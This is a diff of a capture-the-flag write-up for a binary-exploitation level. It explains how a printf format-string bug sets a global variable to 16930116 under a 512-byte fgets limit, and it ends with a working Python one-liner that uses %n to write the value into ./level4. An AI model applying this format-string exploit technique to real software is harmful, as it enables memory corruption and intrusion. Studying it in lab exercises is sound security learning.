@@ -11,7 +11,6 @@ void p(char *param_1)
 }
 
 
-
 void n(void)
 
 {
@@ -25,7 +24,7 @@ void n(void)
   return;
 }
 
-it's the same as the precedent level but this time m should be equal to 16930116 but there is a protection on fgets so we cannot inject a string this long directly to fgets (max size of the buffer is 512).
+it s the same as the precedent level but this time m should be equal to 16930116 but there is a protection on fgets so we cannot inject a string this long directly to fgets (max size of the buffer is 512).
 
 so we need to make printf change the value of m as before with passing a string < 512 bytes.
  first we get the address of m with objdump:
@@ -51,4 +50,4 @@ To complain the if condition we need m = 16930116 bytes. so we have to make 1693
 
 So now we have: address + 16930112 bytes => we placed the result of %n in the 12th block of memory:
 
-(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' ; cat) | ./level4 
+(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' ; cat) | ./level4
